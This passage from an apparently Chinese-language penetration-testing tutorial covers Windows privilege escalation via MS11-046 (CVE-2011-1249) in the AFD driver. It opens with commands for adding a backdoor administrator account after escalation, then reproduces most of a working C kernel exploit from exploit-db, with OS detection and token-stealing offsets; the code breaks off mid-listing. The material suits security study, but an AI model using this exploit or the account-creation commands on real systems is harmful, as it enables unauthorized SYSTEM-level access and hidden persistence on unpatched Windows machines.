<p><strong>提权成功后，可创建属于自己的管理员账号，或者提升自己为管理员权限，如：net
user b b /add，net localgroup Administrators a /add</strong></p>
<h2 id="ms11-046漏洞演示">2. MS11-046漏洞演示</h2>
<ul>
<li><strong>kb2503665</strong></li>
<li>https://docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046</li>
</ul>
<p>可造成DoS，蓝屏等，利用代码可在kali下找到（或<a
href="https://www.exploit-db.com/exploits/40564"
class="uri">https://www.exploit-db.com/exploits/40564</a>下载即可）。</p>
<p><strong>渗透代码（c）：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment"># Exploit Title: Windows x86 (all versions) AFD privilege escalation (MS11-046)</span></span><br><span class="line"><span class="comment"># Date: 2016-10-16</span></span><br><span class="line"><span class="comment"># Exploit Author: Tomislav Paskalev</span></span><br><span class="line"><span class="comment"># Vulnerable Software:</span></span><br><span class="line"><span class="comment">#   Windows XP SP3 x86</span></span><br><span class="line"><span class="comment">#   Windows XP Pro SP2 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2003 SP2 x86</span></span><br><span class="line"><span class="comment">#   Windows Server 2003 SP2 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2003 SP2 Itanium-based Systems</span></span><br><span class="line"><span class="comment">#   Windows Vista SP1 x86</span></span><br><span class="line"><span class="comment">#   Windows Vista SP2 x86</span></span><br><span class="line"><span class="comment">#   Windows Vista SP1 x64</span></span><br><span class="line"><span class="comment">#   Windows Vista SP2 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 x86</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 SP2 x86</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 SP2 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 Itanium-based Systems</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 SP2 Itanium-based Systems</span></span><br><span class="line"><span class="comment">#   Windows 7 x86</span></span><br><span class="line"><span class="comment">#   Windows 7 SP1 x86</span></span><br><span class="line"><span class="comment">#   Windows 7 x64</span></span><br><span class="line"><span class="comment">#   Windows 7 SP1 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 R2 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 R2 SP1 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 R2 Itanium-based Systems</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 R2 SP1 Itanium-based Systems</span></span><br><span class="line"><span class="comment"># Supported Vulnerable Software:</span></span><br><span class="line"><span class="comment">#   Windows XP SP3 x86</span></span><br><span class="line"><span class="comment">#   Windows Server 2003 SP2 x86</span></span><br><span class="line"><span class="comment">#   Windows Vista SP1 x86</span></span><br><span class="line"><span class="comment">#   Windows Vista SP2 x86</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 x86</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 SP2 x86</span></span><br><span class="line"><span class="comment">#   Windows 7 x86</span></span><br><span class="line"><span class="comment">#   Windows 7 SP1 x86</span></span><br><span class="line"><span class="comment"># Tested Software:</span></span><br><span class="line"><span class="comment">#   Windows XP Pro SP3 x86 EN          [5.1.2600]</span></span><br><span class="line"><span class="comment">#   Windows Server 2003 Ent SP2 EN     [5.2.3790]</span></span><br><span class="line"><span class="comment">#   Windows Vista Ult SP1 x86 EN       [6.0.6001]</span></span><br><span class="line"><span class="comment">#   Windows Vista Ult SP2 x86 EN       [6.0.6002]</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 Dat SP1 x86 EN [6.0.6001]</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 Ent SP2 x86 EN [6.0.6002]</span></span><br><span class="line"><span class="comment">#   Windows 7 HB x86 EN                [6.1.7600]</span></span><br><span class="line"><span class="comment">#   Windows 7 Ent SP1 x86 EN           [6.1.7601]</span></span><br><span class="line"><span class="comment"># CVE ID: 2011-1249</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment"># Vulnerability description:</span></span><br><span class="line"><span class="comment">#   The Ancillary Function Driver (AFD) supports Windows sockets</span></span><br><span class="line"><span class="comment">#   applications and is contained in the afd.sys file. The afd.sys</span></span><br><span class="line"><span class="comment">#   driver runs in kernel mode and manages the Winsock TCP/IP</span></span><br><span class="line"><span class="comment">#   communications protocol.</span></span><br><span class="line"><span class="comment">#   An elevation of privilege vulnerability exists where the AFD</span></span><br><span class="line"><span class="comment">#   improperly validates input passed from user mode to the kernel.</span></span><br><span class="line"><span class="comment">#   An attacker must have valid logon credentials and be able to</span></span><br><span class="line"><span class="comment">#   log on locally to exploit the vulnerability.</span></span><br><span class="line"><span class="comment">#   An attacker who successfully exploited this vulnerability could</span></span><br><span class="line"><span class="comment">#   run arbitrary code in kernel mode (i.e. with NT AUTHORITY\SYSTEM</span></span><br><span class="line"><span class="comment">#   privileges).</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment"># Exploit notes:</span></span><br><span class="line"><span class="comment">#   Privileged shell execution:</span></span><br><span class="line"><span class="comment">#     - the SYSTEM shell will spawn within the invoking shell/process</span></span><br><span class="line"><span class="comment">#   Exploit compiling (Kali GNU/Linux Rolling 64-bit):</span></span><br><span class="line"><span class="comment">#     - # i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32</span></span><br><span class="line"><span class="comment">#   Exploit prerequisites:</span></span><br><span class="line"><span class="comment">#     - low privilege access to the target OS</span></span><br><span class="line"><span class="comment">#     - target OS not patched (KB2503665, or any other related</span></span><br><span class="line"><span class="comment">#       patch, if applicable, not installed - check &quot;Related security</span></span><br><span class="line"><span class="comment">#       vulnerabilities/patches&quot;)</span></span><br><span class="line"><span class="comment">#   Exploit test notes:</span></span><br><span class="line"><span class="comment">#     - let the target OS boot properly (if applicable)</span></span><br><span class="line"><span class="comment">#     - Windows 7 (SP0 and SP1) will BSOD on shutdown/reset</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment"># Patches:</span></span><br><span class="line"><span class="comment">#   Windows XP SP3 x86</span></span><br><span class="line"><span class="comment">#     WindowsXP-KB2503665-x86-enu.exe</span></span><br><span class="line"><span class="comment">#       (not available - EoL)</span></span><br><span class="line"><span class="comment">#   Windows Server 2003 SP2 x86</span></span><br><span class="line"><span class="comment">#     WindowsServer2003-KB2503665-x86-enu.exe</span></span><br><span class="line"><span class="comment">#       https://www.microsoft.com/en-us/download/details.aspx?id=26483</span></span><br><span class="line"><span class="comment">#   Windows Vista SP1, SP2 x86; Windows Server 2008 (SP1), SP2 x86</span></span><br><span class="line"><span class="comment">#     Windows6.0-KB2503665-x86.msu</span></span><br><span class="line"><span class="comment">#       https://www.microsoft.com/en-us/download/details.aspx?id=26275</span></span><br><span class="line"><span class="comment">#   Windows 7 (SP0), SP1 x86</span></span><br><span class="line"><span class="comment">#     Windows6.1-KB2503665-x86.msu</span></span><br><span class="line"><span class="comment">#       https://www.microsoft.com/en-us/download/details.aspx?id=26311</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment"># Related security vulnerabilities/patches:</span></span><br><span class="line"><span class="comment">#   MS11-046  KB2503665  https://technet.microsoft.com/en-us/library/security/ms11-046.aspx</span></span><br><span class="line"><span class="comment">#   MS11-080  KB2592799  https://technet.microsoft.com/en-us/library/security/ms11-080.aspx</span></span><br><span class="line"><span class="comment">#   MS12-009  KB2645640  https://technet.microsoft.com/en-us/library/security/ms12-009.aspx</span></span><br><span class="line"><span class="comment">#   MS13-093  KB2875783  https://technet.microsoft.com/en-us/library/security/ms13-093.aspx</span></span><br><span class="line"><span class="comment">#   MS14-040  KB2975684  https://technet.microsoft.com/en-us/library/security/ms14-040.aspx</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   Table of patch replacements:</span></span><br><span class="line"><span class="comment">#                               | MS11-046  | MS11-080  | MS12-009  | MS13-093  | MS14-040  |</span></span><br><span class="line"><span class="comment">#                               -------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                               | KB2503665 | KB2592799 | KB2645640 | KB2875783 | KB2975684 |</span></span><br><span class="line"><span class="comment">#   -----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#   Windows x86 XP SP3          | Installed | &lt;-Replaces|     -     |     -     |     -     |</span></span><br><span class="line"><span class="comment">#   Windows x86 Server 2003 SP2 | Installed | &lt;-Replaces| &lt;-Replaces|     -     | &lt;-Replaces|</span></span><br><span class="line"><span class="comment">#   Windows x86 Vista SP1       | Installed |     -     |     -     |     -     |     -     |</span></span><br><span class="line"><span class="comment">#   Windows x86 Vista SP2       | Installed |     -     |     -     |     -     | &lt;-Replaces|</span></span><br><span class="line"><span class="comment">#   Windows x86 Server 2008     | Installed |     -     |     -     |     -     |     -     |</span></span><br><span class="line"><span class="comment">#   Windows x86 Server 2008 SP2 | Installed |     -     |     -     |     -     | &lt;-Replaces|</span></span><br><span class="line"><span class="comment">#   Windows x86 7               | Installed |     -     |     -     |     -     |     -     |</span></span><br><span class="line"><span class="comment">#   Windows x86 7 SP1           | Installed |     -     |     -     |     -     | &lt;-Replaces|</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment"># Thanks to:</span></span><br><span class="line"><span class="comment">#   azy (XP, 2k3 exploit)</span></span><br><span class="line"><span class="comment">#   Rahul Sasi (PoC)</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment"># References:</span></span><br><span class="line"><span class="comment">#   https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-1249</span></span><br><span class="line"><span class="comment">#   https://technet.microsoft.com/en-us/library/security/ms11-046.aspx</span></span><br><span class="line"><span class="comment">#   http://web.qhwins.com/Security/2012021712023641874126.html</span></span><br><span class="line"><span class="comment">#   https://www.exploit-db.com/exploits/18755/</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// DEFINE DATA TYPES</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">KPROFILE_SOURCE</span> &#123;</span></span><br><span class="line">    ProfileTime,</span><br><span class="line">    ProfileAlignmentFixup,</span><br><span class="line">    ProfileTotalIssues,</span><br><span class="line">    ProfilePipelineDry,</span><br><span class="line">    ProfileLoadInstructions,</span><br><span class="line">    ProfilePipelineFrozen,</span><br><span class="line">    ProfileBranchInstructions,</span><br><span class="line">    ProfileTotalNonissues,</span><br><span class="line">    ProfileDcacheMisses,</span><br><span class="line">    ProfileIcacheMisses,</span><br><span class="line">    ProfileCacheMisses,</span><br><span class="line">    ProfileBranchMispredictions,</span><br><span class="line">    ProfileStoreInstructions,</span><br><span class="line">    ProfileFpInstructions,</span><br><span class="line">    ProfileIntegerInstructions,</span><br><span class="line">    Profile2Issue,</span><br><span class="line">    Profile3Issue,</span><br><span class="line">    Profile4Issue,</span><br><span class="line">    ProfileSpecialInstructions,</span><br><span class="line">    ProfileTotalCycles,</span><br><span class="line">    ProfileIcacheIssues,</span><br><span class="line">    ProfileDcacheAccesses,</span><br><span class="line">    ProfileMemoryBarrierCycles,</span><br><span class="line">    ProfileLoadLinkedIssues,</span><br><span class="line">    ProfileMaximum</span><br><span class="line">&#125; KPROFILE_SOURCE, *PKPROFILE_SOURCE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span> <span class="params">(WINAPI *PNTQUERYINTERVAL)</span> <span class="params">(</span></span><br><span class="line"><span class="params">    KPROFILE_SOURCE   ProfileSource,</span></span><br><span class="line"><span class="params">    PULONG            Interval</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> LONG NTSTATUS;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(WINAPI *PNTALLOCATE)</span> <span class="params">(</span></span><br><span class="line"><span class="params">    HANDLE            ProcessHandle,</span></span><br><span class="line"><span class="params">    PVOID             *BaseAddress,</span></span><br><span class="line"><span class="params">    ULONG             ZeroBits,</span></span><br><span class="line"><span class="params">    PULONG            RegionSize,</span></span><br><span class="line"><span class="params">    ULONG             AllocationType,</span></span><br><span class="line"><span class="params">    ULONG             Protect</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_STATUS_BLOCK</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        NTSTATUS      Status;</span><br><span class="line">        PVOID         Pointer;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG_PTR         Information;</span><br><span class="line">&#125; IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_MODULE_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG             Reserved[<span class="number">2</span>];</span><br><span class="line">    PVOID             Base;</span><br><span class="line">    ULONG             Size;</span><br><span class="line">    ULONG             Flags;</span><br><span class="line">    USHORT            Index;</span><br><span class="line">    USHORT            Unknown;</span><br><span class="line">    USHORT            LoadCount;</span><br><span class="line">    USHORT            ModuleNameOffset;</span><br><span class="line">    CHAR              ImageName[<span class="number">256</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span> <span class="params">(WINAPI *LPFN_ISWOW64PROCESS)</span> <span class="params">(HANDLE, PBOOL)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// FUNCTIONS</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">IsWow64</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    BOOL bIsWow64 = FALSE;</span><br><span class="line">    LPFN_ISWOW64PROCESS fnIsWow64Process;</span><br><span class="line"></span><br><span class="line">    fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32&quot;</span>)), <span class="string">&quot;IsWow64Process&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span> != fnIsWow64Process)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms684139(v=vs.85).aspx</span></span><br><span class="line">        <span class="keyword">if</span> (!fnIsWow64Process(GetCurrentProcess(), &amp;bIsWow64))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;   [-] Failed (error code: %d)\n&quot;</span>, GetLastError());</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bIsWow64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// MAIN FUNCTION</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] MS11-046 (CVE-2011-1249) x86 exploit\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   [*] by Tomislav Paskalev\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// IDENTIFY TARGET OS ARCHITECTURE AND VERSION</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Identifying OS\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// identify target machine&#x27;s OS architecture</span></span><br><span class="line">    <span class="comment">// in case the target machine is running a 64-bit OS</span></span><br><span class="line">    <span class="keyword">if</span>(IsWow64())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [-] 64-bit\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   [+] 32-bit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// identify target machine&#x27;s OS version</span></span><br><span class="line">    <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms724451(v=vs.85).aspx</span></span><br><span class="line">    <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms724832(v=vs.85).aspx</span></span><br><span class="line">    <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms724833(v=vs.85).aspx</span></span><br><span class="line">    OSVERSIONINFOEX osvi;</span><br><span class="line">    ZeroMemory(&amp;osvi, <span class="keyword">sizeof</span>(OSVERSIONINFOEX));</span><br><span class="line">    osvi.dwOSVersionInfoSize = <span class="keyword">sizeof</span>(OSVERSIONINFOEX);</span><br><span class="line">    GetVersionEx((LPOSVERSIONINFO) &amp;osvi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// define operating system version specific variables</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode_KPROCESS;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode_TOKEN;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode_UPID;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode_APLINKS;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> **securityPatchesPtr;</span><br><span class="line">    <span class="type">int</span> securityPatchesCount;</span><br><span class="line">    <span class="type">int</span> lpInBufferSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    OS VERSION SPECIFIC OFFSETS</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    references:</span></span><br><span class="line"><span class="comment">      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kthread/original.htm</span></span><br><span class="line"><span class="comment">      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kthread/late52.htm</span></span><br><span class="line"><span class="comment">      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kthread/current.htm</span></span><br><span class="line"><span class="comment">      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/eprocess/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    - nt!_KTHREAD.ApcState.Process (+0x10)</span></span><br><span class="line"><span class="comment">    0x30 (3.51);</span></span><br><span class="line"><span class="comment">    0x34 (&gt;3.51 to 5.1);</span></span><br><span class="line"><span class="comment">    0x28 (late 5.2);</span></span><br><span class="line"><span class="comment">    0x38 (6.0);</span></span><br><span class="line"><span class="comment">    0x40 (6.1);</span></span><br><span class="line"><span class="comment">    0x70 (6.2 and higher)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    - nt!_EPROCESS.Token</span></span><br><span class="line"><span class="comment">    0x0108 (3.51 to 4.0);</span></span><br><span class="line"><span class="comment">    0x012C (5.0);</span></span><br><span class="line"><span class="comment">    0xC8 (5.1 to early 5.2);</span></span><br><span class="line"><span class="comment">    0xD8 (late 5.2);</span></span><br><span class="line"><span class="comment">    0xE0 (6.0);</span></span><br><span class="line"><span class="comment">    0xF8 (6.1);</span></span><br><span class="line"><span class="comment">    0xEC (6.2 to 6.3);</span></span><br><span class="line"><span class="comment">    0xF4</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    - nt!_EPROCESS.UniqueProcessId</span></span><br><span class="line"><span class="comment">    0x94 (3.51 to 4.0);</span></span><br><span class="line"><span class="comment">    0x9C (5.0);</span></span><br><span class="line"><span class="comment">    0x84 (5.1 to early 5.2);</span></span><br><span class="line"><span class="comment">    0x94 (late 5.2);</span></span><br><span class="line"><span class="comment">    0x9C (6.0);</span></span><br><span class="line"><span class="comment">    0xB4</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    - nt!_EPROCESS.ActiveProcessLinks.Flink</span></span><br><span class="line"><span class="comment">    0x98 (3.51 to 4.0);</span></span><br><span class="line"><span class="comment">    0xA0 (5.0);</span></span><br><span class="line"><span class="comment">    0x88 (5.1 to early 5.2);</span></span><br><span class="line"><span class="comment">    0x98 (late 5.2);</span></span><br><span class="line"><span class="comment">    0xA0 (6.0);</span></span><br><span class="line"><span class="comment">    0xB8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 5.1, service pack 3</span></span><br><span class="line">    <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">5</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">1</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">3</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows XP SP3</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows XP SP3\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x44&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xC8&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\x84&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\x88&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>, <span class="string">&quot;KB2592799&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">2</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x30</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 5.2, service pack 2, not R2</span></span><br><span class="line">    <span class="comment">//   https://msdn.microsoft.com/en-us/library/windows/desktop/ms724385(v=vs.85).aspx</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">5</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">2</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">2</span>) &amp;&amp; (GetSystemMetrics(<span class="number">89</span>) == <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows Server 2003 SP2</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows Server 2003 SP2\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x38&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xD8&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\x94&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\x98&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>, <span class="string">&quot;KB2592799&quot;</span>, <span class="string">&quot;KB2645640&quot;</span>, <span class="string">&quot;KB2975684&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">4</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x30</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 6.0, service pack 1, workstation</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">6</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">0</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">1</span>) &amp;&amp; (osvi.wProductType == <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows Vista SP1</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows Vista SP1\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x48&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xE0&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\x9C&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\xA0&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">1</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x30</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 6.0, service pack 2, workstation</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">6</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">0</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">2</span>) &amp;&amp; (osvi.wProductType == <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows Vista SP2</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows Vista SP2\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x48&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xE0&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\x9C&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\xA0&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>, <span class="string">&quot;KB2975684&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">2</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 6.0, no service pack*, server</span></span><br><span class="line">    <span class="comment">// *Because Windows Server 2008 is based on the Windows NT 6.0 Service Pack 1 kernel, the RTM release is considered to be Service Pack 1;</span></span><br><span class="line">    <span class="comment">// accordingly, the first service pack is called Service Pack 2.</span></span><br><span class="line">    <span class="comment">//   https://en.wikipedia.org/wiki/Windows_Server_2008</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">6</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">0</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">1</span>) &amp;&amp; (osvi.wProductType != <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows Server 2008</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows Server 2008\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x48&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xE0&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\x9C&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\xA0&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> 